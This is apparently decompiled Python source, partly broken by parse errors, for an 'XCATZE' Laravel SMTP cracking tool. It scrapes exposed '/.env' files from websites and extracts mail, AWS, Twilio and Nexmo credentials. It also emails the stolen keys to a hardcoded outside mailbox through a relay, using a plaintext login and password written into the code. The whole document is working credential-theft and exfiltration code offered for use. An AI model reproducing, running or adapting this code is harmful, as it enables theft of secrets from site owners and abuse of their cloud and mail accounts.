               60  CALL_FUNCTION_1       1  ''
               62  STORE_FAST               'sender_email'
             64_0  COME_FROM            46  '46'

 L. 765        64  LOAD_GLOBAL              str
               66  LOAD_FAST                'host'
               68  CALL_FUNCTION_1       1  ''
               70  STORE_FAST               'smtp_server'

 L. 766        72  LOAD_GLOBAL              str
               74  LOAD_FAST                'user'
               76  LOAD_METHOD              replace
               78  LOAD_STR                 '"'
               80  LOAD_STR                 ''
               82  CALL_METHOD_2         2  ''
               84  CALL_FUNCTION_1       1  ''
               86  STORE_FAST               'login'

 L. 767        88  LOAD_GLOBAL              str
               90  LOAD_FAST                'passw'
               92  LOAD_METHOD              replace
               94  LOAD_STR                 '"'
               96  LOAD_STR                 ''
               98  CALL_METHOD_2         2  ''
              100  CALL_FUNCTION_1       1  ''
              102  STORE_FAST               'password'

 L. 770       104  LOAD_GLOBAL              str
              106  LOAD_GLOBAL              fsetting
              108  CALL_FUNCTION_1       1  ''
              110  STORE_FAST               'receiver_email'

 L. 772       112  LOAD_GLOBAL              MIMEMultipart
              114  LOAD_STR                 'alternative'
              116  CALL_FUNCTION_1       1  ''
              118  STORE_FAST               'message'

 L. 773       120  LOAD_STR                 'LARAVEL SMTP CRACK | HOST: '
              122  LOAD_GLOBAL              str
              124  LOAD_FAST                'host'
              126  CALL_FUNCTION_1       1  ''
              128  BINARY_ADD       
              130  LOAD_FAST                'message'
              132  LOAD_STR                 'Subject'
              134  STORE_SUBSCR     

 L. 774       136  LOAD_STR                 'zoho'
              138  LOAD_FAST                'host'
              140  COMPARE_OP               in
              142  POP_JUMP_IF_FALSE   154  'to 154'

 L. 775       144  LOAD_FAST                'user'
              146  LOAD_FAST                'message'
              148  LOAD_STR                 'From'
              150  STORE_SUBSCR     
              152  JUMP_FORWARD        162  'to 162'
            154_0  COME_FROM           142  '142'

 L. 777       154  LOAD_FAST                'sender_email'
              156  LOAD_FAST                'message'
              158  LOAD_STR                 'From'
              160  STORE_SUBSCR     
            162_0  COME_FROM           152  '152'

 L. 778       162  LOAD_FAST                'receiver_email'
              164  LOAD_FAST                'message'
              166  LOAD_STR                 'To'
              168  STORE_SUBSCR     

 L. 779       170  LOAD_STR                 '        '
              172  STORE_FAST               'text'

 L. 782       174  LOAD_STR                 '        <html>\n          <body>\n            <p>Success Send,<br>\n              BY XCATZE</p>\n              <p>-------------------</p>\n              <p>URL    : '

 L. 788       176  LOAD_FAST                'url'

 L. 782       178  FORMAT_VALUE          0  ''
              180  LOAD_STR                 '</p>\n              <p>HOST   : '

 L. 789       182  LOAD_FAST                'host'

 L. 782       184  FORMAT_VALUE          0  ''
              186  LOAD_STR                 '</p>\n              <p>PORT   : '

 L. 790       188  LOAD_FAST                'port'

 L. 782       190  FORMAT_VALUE          0  ''
              192  LOAD_STR                 '</p>\n              <p>USER   : '

 L. 791       194  LOAD_FAST                'user'

 L. 782       196  FORMAT_VALUE          0  ''
              198  LOAD_STR                 '</p>\n              <p>PASSW  : '

 L. 792       200  LOAD_FAST                'passw'

 L. 782       202  FORMAT_VALUE          0  ''
              204  LOAD_STR                 '</p>\n              <p>SENDER : '

 L. 793       206  LOAD_FAST                'sender'

 L. 782       208  FORMAT_VALUE          0  ''
              210  LOAD_STR                 '</p>\n              <p>-------------------</p>\n          </body>\n        </html>\n        '
              212  BUILD_STRING_13      13 
              214  STORE_FAST               'html'

 L. 798       216  LOAD_GLOBAL              MIMEText
              218  LOAD_FAST                'text'
              220  LOAD_STR                 'plain'
              222  CALL_FUNCTION_2       2  ''
              224  STORE_FAST               'part1'

 L. 799       226  LOAD_GLOBAL              MIMEText
              228  LOAD_FAST                'html'
              230  LOAD_STR                 'html'
              232  CALL_FUNCTION_2       2  ''
              234  STORE_FAST               'part2'

 L. 800       236  LOAD_FAST                'message'
              238  LOAD_METHOD              attach
              240  LOAD_FAST                'part1'
              242  CALL_METHOD_1         1  ''
              244  POP_TOP          

 L. 801       246  LOAD_FAST                'message'
              248  LOAD_METHOD              attach
              250  LOAD_FAST                'part2'
              252  CALL_METHOD_1         1  ''
              254  POP_TOP          

 L. 803       256  SETUP_FINALLY       414  'to 414'

 L. 804       258  LOAD_GLOBAL              smtplib
              260  LOAD_METHOD              SMTP
              262  LOAD_FAST                'smtp_server'
              264  LOAD_FAST                'port'
              266  CALL_METHOD_2         2  ''
              268  STORE_FAST               's'

 L. 805       270  LOAD_FAST                's'
              272  LOAD_METHOD              connect
              274  LOAD_FAST                'smtp_server'
              276  LOAD_FAST                'port'
              278  CALL_METHOD_2         2  ''
              280  POP_TOP          

 L. 806       282  LOAD_FAST                's'
              284  LOAD_METHOD              ehlo
              286  CALL_METHOD_0         0  ''
              288  POP_TOP          

 L. 807       290  LOAD_FAST                's'
              292  LOAD_METHOD              starttls
              294  CALL_METHOD_0         0  ''
              296  POP_TOP          

 L. 808       298  LOAD_FAST                's'
              300  LOAD_METHOD              ehlo
              302  CALL_METHOD_0         0  ''
              304  POP_TOP          

 L. 809       306  LOAD_FAST                's'
              308  LOAD_METHOD              login
              310  LOAD_FAST                'login'
              312  LOAD_FAST                'password'
              314  CALL_METHOD_2         2  ''
              316  POP_TOP          

 L. 810       318  LOAD_FAST                's'
              320  LOAD_METHOD              sendmail
              322  LOAD_FAST                'sender_email'
              324  LOAD_FAST                'receiver_email'
              326  LOAD_FAST                'message'
              328  LOAD_METHOD              as_string
              330  CALL_METHOD_0         0  ''
              332  CALL_METHOD_3         3  ''
              334  POP_TOP          

 L. 811       336  LOAD_GLOBAL              print
              338  LOAD_STR                 'Sent To '
              340  LOAD_GLOBAL              str
              342  LOAD_GLOBAL              fsetting
              344  CALL_FUNCTION_1       1  ''
              346  BINARY_ADD       
              348  CALL_FUNCTION_1       1  ''
              350  POP_TOP          

 L. 812       352  LOAD_STR                 'apikey'
              354  LOAD_FAST                'user'
              356  COMPARE_OP               in
          358_360  POP_JUMP_IF_TRUE    392  'to 392'
              362  LOAD_STR                 'aws'
              364  LOAD_FAST                'host'
              366  COMPARE_OP               in
          368_370  POP_JUMP_IF_TRUE    392  'to 392'
              372  LOAD_STR                 'mailgun'
              374  LOAD_FAST                'host'
              376  COMPARE_OP               in
          378_380  POP_JUMP_IF_TRUE    392  'to 392'
              382  LOAD_STR                 'mandrill'
              384  LOAD_FAST                'host'
              386  COMPARE_OP               in
          388_390  POP_JUMP_IF_FALSE   410  'to 410'
            392_0  COME_FROM           378  '378'
            392_1  COME_FROM           368  '368'
            392_2  COME_FROM           358  '358'

 L. 813       392  LOAD_GLOBAL              sendtestoff
              394  LOAD_FAST                'url'
              396  LOAD_FAST                'host'
              398  LOAD_FAST                'port'
              400  LOAD_FAST                'user'
              402  LOAD_FAST                'passw'
              404  LOAD_FAST                'sender'
              406  CALL_FUNCTION_6       6  ''
              408  POP_TOP          
            410_0  COME_FROM           388  '388'
              410  POP_BLOCK        
              412  JUMP_FORWARD        530  'to 530'
            414_0  COME_FROM_FINALLY   256  '256'

 L. 814       414  DUP_TOP          
              416  LOAD_GLOBAL              gaierror
              418  LOAD_GLOBAL              ConnectionRefusedError
              420  BUILD_TUPLE_2         2 
              422  COMPARE_OP               exception-match
          424_426  POP_JUMP_IF_FALSE   446  'to 446'
              428  POP_TOP          
              430  POP_TOP          
              432  POP_TOP          

 L. 815       434  LOAD_GLOBAL              print
              436  LOAD_STR                 'Failed to connect to the server. Bad connection settings?'
              438  CALL_FUNCTION_1       1  ''
              440  POP_TOP          
              442  POP_EXCEPT       
              444  JUMP_FORWARD        530  'to 530'
            446_0  COME_FROM           424  '424'

 L. 816       446  DUP_TOP          
              448  LOAD_GLOBAL              smtplib
              450  LOAD_ATTR                SMTPServerDisconnected
              452  COMPARE_OP               exception-match
          454_456  POP_JUMP_IF_FALSE   476  'to 476'
              458  POP_TOP          
              460  POP_TOP          
              462  POP_TOP          

 L. 817       464  LOAD_GLOBAL              print
              466  LOAD_STR                 'Failed to connect to the server. Wrong user/password?'
              468  CALL_FUNCTION_1       1  ''
              470  POP_TOP          
              472  POP_EXCEPT       
              474  JUMP_FORWARD        530  'to 530'
            476_0  COME_FROM           454  '454'

 L. 818       476  DUP_TOP          
              478  LOAD_GLOBAL              smtplib
              480  LOAD_ATTR                SMTPException
              482  COMPARE_OP               exception-match
          484_486  POP_JUMP_IF_FALSE   528  'to 528'
              488  POP_TOP          
              490  STORE_FAST               'e'
              492  POP_TOP          
              494  SETUP_FINALLY       516  'to 516'

 L. 819       496  LOAD_GLOBAL              print
              498  LOAD_STR                 'SMTP error occurred: '
              500  LOAD_GLOBAL              str
              502  LOAD_FAST                'e'
              504  CALL_FUNCTION_1       1  ''
              506  BINARY_ADD       
              508  CALL_FUNCTION_1       1  ''
              510  POP_TOP          
              512  POP_BLOCK        
              514  BEGIN_FINALLY    
            516_0  COME_FROM_FINALLY   494  '494'
              516  LOAD_CONST               None
              518  STORE_FAST               'e'
              520  DELETE_FAST              'e'
              522  END_FINALLY      
              524  POP_EXCEPT       
              526  JUMP_FORWARD        530  'to 530'
            528_0  COME_FROM           484  '484'
              528  END_FINALLY      
            530_0  COME_FROM           526  '526'
            530_1  COME_FROM           474  '474'
            530_2  COME_FROM           444  '444'
            530_3  COME_FROM           412  '412'

Parse error at or near `JUMP_FORWARD' instruction at offset 412


def sendtestaws(url, user, passw, ports, re2, re1):
    smtp_server = 'smtp-relay.gmail.com'
    sender_email = 'whm@sending.today'
    port = 587
    login = 'whm@sending.today'
    password = 'Moris1905!!'
    receiver_email = 'showdenwashere@hotmail.com'
    message = MIMEMultipart('alternative')
    message['Subject'] = 'AWS KEY LOG | ' + str(ports)
    message['From'] = sender_email
    message['To'] = receiver_email
    text = '        '
    html = f"        <html>\n          <body>\n            <p>Success Send,<br>\n              BY XCATZE</p>\n              <p>-------------------</p>\n              <p>URL          : {url}</p>\n              <p>AWSKEY       : {user}</p>\n              <p>SECRET KEY   : {passw}</p>\n              <p>CHECKER      : {user}|{passw}|{ports}</p>\n              <p>-------------------</p>\n              <p>CREATED USER =></p>\n              <p></p>\n              <p>{re2}</p>\n              <p></p>\n              <p>USER : ses_xcatze</p>\n              <p>Pass : ses_xcatze123</p>\n              <p>-------------------</p>\n              <p>LIMIT DETAIL =></p>\n              <p></p>\n              <p>{re1}</p>\n              <p>-------------------</p>\n          </body>\n        </html>\n        "
    part1 = MIMEText(text, 'plain')
    part2 = MIMEText(html, 'html')
    message.attach(part1)
    message.attach(part2)
    try:
        s = smtplib.SMTP(smtp_server, port)
        s.connect(smtp_server, port)
        s.ehlo()
        s.starttls()
        s.ehlo()
        s.login(login, password)
        s.sendmail(sender_email, receiver_email, message.as_string())
    except:
        pass


def sendtesttwillio(url, user, passw, ports, status, balance):
    smtp_server = 'smtp-relay.gmail.com'
    sender_email = 'whm@sending.today'
    port = 587
    login = 'whm@sending.today'
    password = 'Moris1905!!'
    receiver_email = 'showdenwashere@hotmail.com'
    message = MIMEMultipart('alternative')
    message['Subject'] = 'TWILLIO LOG | ' + str(ports)
    message['From'] = sender_email
    message['To'] = receiver_email
    text = '        '
    html = f"        <html>\n          <body>\n            <p>Success Send,<br>\n              BY XCATZE</p>\n              <p>-------------------</p>\n              <p>URL      : {url}</p>\n              <p>SID      : {user}</p>\n              <p>TOKEN    : {passw}</p>\n              <p>FROM     : {ports}</p>\n              <p>STATUS   : {status}</p>\n              <p>BALANCE  : {balance}</p>\n              <p>-------------------</p>\n          </body>\n        </html>\n        "
    part1 = MIMEText(text, 'plain')
    part2 = MIMEText(html, 'html')
    message.attach(part1)
    message.attach(part2)
    try:
        s = smtplib.SMTP(smtp_server, port)
        s.connect(smtp_server, port)
        s.ehlo()
        s.starttls()
        s.ehlo()
        s.login(login, password)
        s.sendmail(sender_email, receiver_email, message.as_string())
    except:
        pass


def sendtestnexmo(url, user, passw, balance):
    smtp_server = 'smtp-relay.gmail.com'
    sender_email = 'whm@sending.today'
    port = 587
    login = 'whm@sending.today'
    password = 'Moris1905!!'
    receiver_email = 'showdenwashere@hotmail.com'
    message = MIMEMultipart('alternative')
    message['Subject'] = 'NEXMO LOG | ' + str(ports)
    message['From'] = sender_email
    message['To'] = receiver_email
    text = '        '
    html = f"        <html>\n          <body>\n            <p>Success Send,<br>\n              BY XCATZE</p>\n              <p>-------------------</p>\n              <p>URL      : {url}</p>\n              <p>NEXMO    : {user}</p>\n              <p>NEXMOAPI : {passw}</p>\n              <p>BALANCE  : {balance}</p>\n              <p>-------------------</p>\n          </body>\n        </html>\n        "
    part1 = MIMEText(text, 'plain')
    part2 = MIMEText(html, 'html')
    message.attach(part1)
    message.attach(part2)
    try:
        s = smtplib.SMTP(smtp_server, port)
        s.connect(smtp_server, port)
        s.ehlo()
        s.starttls()
        s.ehlo()
        s.login(login, password)
        s.sendmail(sender_email, receiver_email, message.as_string())
    except:
        pass


def prepare(sites):
    try:
        meki = requests.get((sites + '/.env'), headers=Headers, timeout=8)
        if 'DB_PASSWORD=' in meki.text:
            print('\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40mSuccess'.format(str(sites)))
            open('config-' + year + month + day + '.txt', 'a').write('\n---------------KRINSIDE env-------------\n' + sites + '\n' + meki.text + '\n-----------------------------------------\n\n')
        else:
            print('\x1b[1;40m[BY XCATZE] {} |   \x1b[1;31;40mFailed'.format(str(sites)))
    except Exception as e:
        try:
            pass
        finally:
            e = None
            del e


def get_smtp--- This code section failed: ---

 L. 982       0_2  SETUP_FINALLY      5932  'to 5932'

 L. 983         4  LOAD_STR                 'MAIL_HOST'
                6  LOAD_FAST                'text'
                8  COMPARE_OP               in
            10_12  POP_JUMP_IF_FALSE  1740  'to 1740'

 L. 984        14  LOAD_STR                 'MAIL_HOST='
               16  LOAD_FAST                'text'
               18  COMPARE_OP               in
            20_22  POP_JUMP_IF_FALSE  1758  'to 1758'

 L. 985        24  LOAD_GLOBAL              reg
               26  LOAD_STR                 '\nMAIL_HOST=(.*?)\n'
               28  LOAD_FAST                'text'
               30  CALL_FUNCTION_2       2  ''
               32  LOAD_CONST               0
               34  BINARY_SUBSCR    
               36  STORE_FAST               'mailhost'

 L. 986        38  SETUP_FINALLY        58  'to 58'

 L. 987        40  LOAD_GLOBAL              reg
               42  LOAD_STR                 '\nMAIL_PORT=(.*?)\n'
               44  LOAD_FAST                'text'
               46  CALL_FUNCTION_2       2  ''
               48  LOAD_CONST               0
               50  BINARY_SUBSCR    
               52  STORE_FAST               'mailport'
               54  POP_BLOCK        
               56  JUMP_FORWARD         74  'to 74'
             58_0  COME_FROM_FINALLY    38  '38'

 L. 988        58  POP_TOP          
               60  POP_TOP          
               62  POP_TOP          

 L. 989        64  LOAD_CONST               587
               66  STORE_FAST               'mailport'
               68  POP_EXCEPT       
               70  JUMP_FORWARD         74  'to 74'
               72  END_FINALLY      
             74_0  COME_FROM            70  '70'
             74_1  COME_FROM            56  '56'

 L. 990        74  LOAD_GLOBAL              reg
               76  LOAD_STR                 '\nMAIL_USERNAME=(.*?)\n'
               78  LOAD_FAST                'text'
               80  CALL_FUNCTION_2       2  ''
               82  LOAD_CONST               0
               84  BINARY_SUBSCR    
               86  STORE_FAST               'mailuser'

 L. 991        88  LOAD_GLOBAL              reg
               90  LOAD_STR                 '\nMAIL_PASSWORD=(.*?)\n'
               92  LOAD_FAST                'text'
               94  CALL_FUNCTION_2       2  ''
               96  LOAD_CONST               0
               98  BINARY_SUBSCR    
              100  STORE_FAST               'mailpass'

 L. 992       102  LOAD_STR                 'MAIL_FROM'
              104  LOAD_FAST                'text'
              106  COMPARE_OP               in
              108  POP_JUMP_IF_FALSE   126  'to 126'

 L. 993       110  LOAD_GLOBAL              reg
              112  LOAD_STR                 '\nMAIL_FROM_ADDRESS=(.*?)\n'
              114  LOAD_FAST                'text'
              116  CALL_FUNCTION_2       2  ''
              118  LOAD_CONST               0
              120  BINARY_SUBSCR    
              122  STORE_FAST               'mailfrom'
              124  JUMP_FORWARD        130  'to 130'
            126_0  COME_FROM           108  '108'

 L. 995       126  LOAD_STR                 'unknown@unknown.com'
              128  STORE_FAST               'mailfrom'
            130_0  COME_FROM           124  '124'

 L. 997       130  LOAD_STR                 'URL: '
              132  LOAD_GLOBAL              str
              134  LOAD_FAST                'url'
              136  CALL_FUNCTION_1       1  ''
              138  BINARY_ADD       
              140  LOAD_STR                 '\nMAILHOST: '
              142  BINARY_ADD       
              144  LOAD_GLOBAL              str
              146  LOAD_FAST                'mailhost'
              148  CALL_FUNCTION_1       1  ''
              150  BINARY_ADD       
              152  LOAD_STR                 '\nMAILPORT: '
              154  BINARY_ADD       
              156  LOAD_GLOBAL              str
              158  LOAD_FAST                'mailport'
              160  CALL_FUNCTION_1       1  ''
              162  BINARY_ADD       
              164  LOAD_STR                 '\nMAILUSER: '
              166  BINARY_ADD       
              168  LOAD_GLOBAL              str
              170  LOAD_FAST                'mailuser'
              172  CALL_FUNCTION_1       1  ''
              174  BINARY_ADD       
              176  LOAD_STR                 '\nMAILPASS: '
              178  BINARY_ADD       
              180  LOAD_GLOBAL              str
              182  LOAD_FAST                'mailpass'
              184  CALL_FUNCTION_1       1  ''
              186  BINARY_ADD       
              188  LOAD_STR                 '\nMAILFROM: '
              190  BINARY_ADD       
              192  LOAD_GLOBAL              str
              194  LOAD_FAST                'mailfrom'
              196  CALL_FUNCTION_1       1  ''
              198  BINARY_ADD       
              200  STORE_FAST               'build'

 L. 998       202  LOAD_GLOBAL              str
              204  LOAD_FAST                'build'
              206  CALL_FUNCTION_1       1  ''
              208  LOAD_METHOD              replace
              210  LOAD_STR                 '\r'
              212  LOAD_STR                 ''
              214  CALL_METHOD_2         2  ''
              216  STORE_FAST               'remover'

 L. 999       218  LOAD_STR                 '.amazonaws.com'
              220  LOAD_FAST                'text'
              222  COMPARE_OP               in
          224_226  POP_JUMP_IF_FALSE   584  'to 584'
              228  LOAD_GLOBAL              aws
              230  CALL_FUNCTION_0       0  ''
              232  LOAD_STR                 'on'
              234  COMPARE_OP               ==
          236_238  POP_JUMP_IF_FALSE   584  'to 584'

 L.1000       240  LOAD_GLOBAL              reg
              242  LOAD_STR                 '\nMAIL_HOST=(.*?)\n'
              244  LOAD_FAST                'text'
              246  CALL_FUNCTION_2       2  ''
              248  LOAD_CONST               0
              250  BINARY_SUBSCR    
              252  STORE_FAST               'mailhost'

 L.1001       254  LOAD_GLOBAL              reg
              256  LOAD_STR                 '\nMAIL_PORT=(.*?)\n'
              258  LOAD_FAST                'text'
              260  CALL_FUNCTION_2       2  ''
              262  LOAD_CONST               0
              264  BINARY_SUBSCR    
              266  STORE_FAST               'mailport'

 L.1002       268  LOAD_GLOBAL              reg
              270  LOAD_STR                 '\nMAIL_USERNAME=(.*?)\n'
              272  LOAD_FAST                'text'
              274  CALL_FUNCTION_2       2  ''
              276  LOAD_CONST               0
              278  BINARY_SUBSCR    
              280  STORE_FAST               'mailuser'

 L.1003       282  LOAD_GLOBAL              reg
              284  LOAD_STR                 '\nMAIL_PASSWORD=(.*?)\n'
              286  LOAD_FAST                'text'
              288  CALL_FUNCTION_2       2  ''
              290  LOAD_CONST               0
              292  BINARY_SUBSCR    
              294  STORE_FAST               'mailpass'

 L.1004       296  LOAD_STR                 'MAIL_FROM'
              298  LOAD_FAST                'text'
              300  COMPARE_OP               in
          302_304  POP_JUMP_IF_FALSE   322  'to 322'

 L.1005       306  LOAD_GLOBAL              reg
              308  LOAD_STR                 '\nMAIL_FROM_ADDRESS=(.*?)\n'
              310  LOAD_FAST                'text'
              312  CALL_FUNCTION_2       2  ''
              314  LOAD_CONST               0
              316  BINARY_SUBSCR    
              318  STORE_FAST               'emailform'
              320  JUMP_FORWARD        326  'to 326'
            322_0  COME_FROM           302  '302'

 L.1007       322  LOAD_STR                 'UNKNOWN'
              324  STORE_FAST               'emailform'
            326_0  COME_FROM           320  '320'

 L.1008       326  LOAD_GLOBAL              reg
              328  LOAD_STR                 'email-smtp.(.*?).amazonaws.com'
              330  LOAD_FAST                'mailhost'
              332  CALL_FUNCTION_2       2  ''
              334  LOAD_CONST               0
              336  BINARY_SUBSCR    
              338  STORE_FAST               'getcountry'

 L.1010       340  LOAD_STR                 'URL: '
              342  LOAD_GLOBAL              str
              344  LOAD_FAST                'url'
              346  CALL_FUNCTION_1       1  ''
              348  BINARY_ADD       
              350  LOAD_STR                 '\nMAILHOST: '
              352  BINARY_ADD       
              354  LOAD_GLOBAL              str
              356  LOAD_FAST                'mailhost'
              358  CALL_FUNCTION_1       1  ''
              360  BINARY_ADD       
              362  LOAD_STR                 '\nMAILPORT: '
              364  BINARY_ADD       
              366  LOAD_GLOBAL              str
              368  LOAD_FAST                'mailport'
              370  CALL_FUNCTION_1       1  ''
              372  BINARY_ADD       
              374  LOAD_STR                 '\nMAILUSER: '
              376  BINARY_ADD       
              378  LOAD_GLOBAL              str
              380  LOAD_FAST                'mailuser'
              382  CALL_FUNCTION_1       1  ''
              384  BINARY_ADD       
              386  LOAD_STR                 '\nMAILPASS: '
              388  BINARY_ADD       
              390  LOAD_GLOBAL              str
              392  LOAD_FAST                'mailpass'
              394  CALL_FUNCTION_1       1  ''
              396  BINARY_ADD       
              398  LOAD_STR                 '\nMAIL_FROM_ADDRESS: '
              400  BINARY_ADD       
              402  LOAD_GLOBAL              str
              404  LOAD_FAST                'emailform'
              406  CALL_FUNCTION_1       1  ''
              408  BINARY_ADD       
              410  STORE_FAST               'build'

 L.1011       412  LOAD_GLOBAL              str
              414  LOAD_FAST                'build'
              416  CALL_FUNCTION_1       1  ''
              418  LOAD_METHOD              replace
              420  LOAD_STR                 '\r'
              422  LOAD_STR                 ''
              424  CALL_METHOD_2         2  ''
              426  STORE_FAST               'remover'

 L.1012       428  LOAD_GLOBAL              print
              430  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40m amazonaws\n'
              432  LOAD_METHOD              format
              434  LOAD_GLOBAL              str
              436  LOAD_FAST                'url'
              438  CALL_FUNCTION_1       1  ''
              440  CALL_METHOD_1         1  ''
              442  CALL_FUNCTION_1       1  ''
              444  POP_TOP          

 L.1013       446  LOAD_GLOBAL              open
              448  LOAD_STR                 'result/'
              450  LOAD_FAST                'getcountry'
              452  BINARY_ADD       
              454  LOAD_STR                 '.txt'
              456  BINARY_ADD       
              458  LOAD_STR                 'a'
              460  CALL_FUNCTION_2       2  ''
              462  STORE_FAST               'save'

 L.1014       464  LOAD_FAST                'save'
              466  LOAD_METHOD              write
              468  LOAD_GLOBAL              str
              470  LOAD_FAST                'remover'
              472  CALL_FUNCTION_1       1  ''
              474  LOAD_STR                 '\n\n'
              476  BINARY_ADD       
              478  CALL_METHOD_1         1  ''
              480  POP_TOP          

 L.1015       482  LOAD_FAST                'save'
              484  LOAD_METHOD              close
              486  CALL_METHOD_0         0  ''
              488  POP_TOP          

 L.1016       490  LOAD_GLOBAL              open
              492  LOAD_STR                 'result/smtp_aws_ses.txt'
              494  LOAD_STR                 'a'
              496  CALL_FUNCTION_2       2  ''
              498  STORE_FAST               'save2'

 L.1017       500  LOAD_FAST                'save2'
              502  LOAD_METHOD              write
              504  LOAD_GLOBAL              str
              506  LOAD_FAST                'remover'
              508  CALL_FUNCTION_1       1  ''
              510  LOAD_STR                 '\n\n'
              512  BINARY_ADD       
              514  CALL_METHOD_1         1  ''
              516  POP_TOP          

 L.1018       518  LOAD_FAST                'save2'
              520  LOAD_METHOD              close
              522  CALL_METHOD_0         0  ''
              524  POP_TOP          

 L.1019       526  SETUP_FINALLY       550  'to 550'

 L.1020       528  LOAD_GLOBAL              sendtest
              530  LOAD_FAST                'url'
              532  LOAD_FAST                'mailhost'
              534  LOAD_FAST                'mailport'
              536  LOAD_FAST                'mailuser'
              538  LOAD_FAST                'mailpass'
              540  LOAD_FAST                'emailform'
              542  CALL_FUNCTION_6       6  ''
              544  POP_TOP          
              546  POP_BLOCK        
              548  JUMP_FORWARD       1684  'to 1684'
            550_0  COME_FROM_FINALLY   526  '526'

 L.1021       550  POP_TOP          
              552  POP_TOP          
              554  POP_TOP          

 L.1022       556  LOAD_GLOBAL              print
              558  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;31;40mFailed Send\n'
              560  LOAD_METHOD              format
              562  LOAD_GLOBAL              str
              564  LOAD_FAST                'url'
              566  CALL_FUNCTION_1       1  ''
              568  CALL_METHOD_1         1  ''
              570  CALL_FUNCTION_1       1  ''
              572  POP_TOP          
              574  POP_EXCEPT       
              576  JUMP_FORWARD       1684  'to 1684'
              578  END_FINALLY      
          580_582  JUMP_FORWARD       1684  'to 1684'
            584_0  COME_FROM           236  '236'
            584_1  COME_FROM           224  '224'

 L.1024       584  LOAD_STR                 'smtp.sendgrid.net'
              586  LOAD_GLOBAL              str
              588  LOAD_FAST                'mailhost'
              590  CALL_FUNCTION_1       1  ''
              592  COMPARE_OP               in
          594_596  POP_JUMP_IF_FALSE   668  'to 668'
              598  LOAD_GLOBAL              sendgrid
              600  CALL_FUNCTION_0       0  ''
              602  LOAD_STR                 'on'
              604  COMPARE_OP               ==
          606_608  POP_JUMP_IF_FALSE   668  'to 668'

 L.1025       610  LOAD_GLOBAL              print
              612  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40mSendgrid\n'
              614  LOAD_METHOD              format
              616  LOAD_GLOBAL              str
              618  LOAD_FAST                'url'
              620  CALL_FUNCTION_1       1  ''
              622  CALL_METHOD_1         1  ''
              624  CALL_FUNCTION_1       1  ''
              626  POP_TOP          

 L.1026       628  LOAD_GLOBAL              open
              630  LOAD_STR                 'result/sendgrid.txt'
              632  LOAD_STR                 'a'
              634  CALL_FUNCTION_2       2  ''
              636  STORE_FAST               'save'

 L.1027       638  LOAD_FAST                'save'
              640  LOAD_METHOD              write
              642  LOAD_GLOBAL              str
              644  LOAD_FAST                'remover'
              646  CALL_FUNCTION_1       1  ''
              648  LOAD_STR                 '\n\n'
              650  BINARY_ADD       
              652  CALL_METHOD_1         1  ''
              654  POP_TOP          

 L.1028       656  LOAD_FAST                'save'
              658  LOAD_METHOD              close
              660  CALL_METHOD_0         0  ''
              662  POP_TOP          
          664_666  JUMP_FORWARD       1684  'to 1684'
            668_0  COME_FROM           606  '606'
            668_1  COME_FROM           594  '594'

 L.1029       668  LOAD_STR                 'mailgun.org'
              670  LOAD_GLOBAL              str
              672  LOAD_FAST                'mailhost'
              674  CALL_FUNCTION_1       1  ''
              676  COMPARE_OP               in
          678_680  POP_JUMP_IF_FALSE   752  'to 752'
              682  LOAD_GLOBAL              mailgun
              684  CALL_FUNCTION_0       0  ''
              686  LOAD_STR                 'on'
              688  COMPARE_OP               ==
          690_692  POP_JUMP_IF_FALSE   752  'to 752'

 L.1030       694  LOAD_GLOBAL              print
              696  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40mmailgun\n'
              698  LOAD_METHOD              format
              700  LOAD_GLOBAL              str
              702  LOAD_FAST                'url'
              704  CALL_FUNCTION_1       1  ''
              706  CALL_METHOD_1         1  ''
              708  CALL_FUNCTION_1       1  ''
              710  POP_TOP          

 L.1031       712  LOAD_GLOBAL              open
              714  LOAD_STR                 'result/mailgun.txt'
              716  LOAD_STR                 'a'
              718  CALL_FUNCTION_2       2  ''
              720  STORE_FAST               'save'

 L.1032       722  LOAD_FAST                'save'
              724  LOAD_METHOD              write
              726  LOAD_GLOBAL              str
              728  LOAD_FAST                'remover'
              730  CALL_FUNCTION_1       1  ''
              732  LOAD_STR                 '\n\n'
              734  BINARY_ADD       
              736  CALL_METHOD_1         1  ''
              738  POP_TOP          

 L.1033       740  LOAD_FAST                'save'
              742  LOAD_METHOD              close
              744  CALL_METHOD_0         0  ''
              746  POP_TOP          
          748_750  JUMP_FORWARD       1684  'to 1684'
            752_0  COME_FROM           690  '690'
            752_1  COME_FROM           678  '678'

 L.1034       752  LOAD_STR                 'sparkpostmail.com'
              754  LOAD_GLOBAL              str
              756  LOAD_FAST                'mailhost'
              758  CALL_FUNCTION_1       1  ''
              760  COMPARE_OP               in
          762_764  POP_JUMP_IF_FALSE   836  'to 836'
              766  LOAD_GLOBAL              sparkpostmail
              768  CALL_FUNCTION_0       0  ''
              770  LOAD_STR                 'on'
              772  COMPARE_OP               ==
          774_776  POP_JUMP_IF_FALSE   836  'to 836'

 L.1035       778  LOAD_GLOBAL              print
              780  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40msparkpostmail\n'
              782  LOAD_METHOD              format
              784  LOAD_GLOBAL              str
              786  LOAD_FAST                'url'
              788  CALL_FUNCTION_1       1  ''
              790  CALL_METHOD_1         1  ''
              792  CALL_FUNCTION_1       1  ''
              794  POP_TOP          

 L.1036       796  LOAD_GLOBAL              open
              798  LOAD_STR                 'result/sparkpostmail.txt'
              800  LOAD_STR                 'a'
              802  CALL_FUNCTION_2       2  ''
              804  STORE_FAST               'save'

 L.1037       806  LOAD_FAST                'save'
              808  LOAD_METHOD              write
              810  LOAD_GLOBAL              str
              812  LOAD_FAST                'remover'
              814  CALL_FUNCTION_1       1  ''
              816  LOAD_STR                 '\n\n'
              818  BINARY_ADD       
              820  CALL_METHOD_1         1  ''
              822  POP_TOP          

 L.1038       824  LOAD_FAST                'save'
              826  LOAD_METHOD              close
              828  CALL_METHOD_0         0  ''
              830  POP_TOP          
          832_834  JUMP_FORWARD       1684  'to 1684'
            836_0  COME_FROM           774  '774'
            836_1  COME_FROM           762  '762'

 L.1039       836  LOAD_STR                 'mandrillapp.com'
              838  LOAD_GLOBAL              str
              840  LOAD_FAST                'mailhost'
              842  CALL_FUNCTION_1       1  ''
              844  COMPARE_OP               in
          846_848  POP_JUMP_IF_FALSE   920  'to 920'
              850  LOAD_GLOBAL              mandrillapp
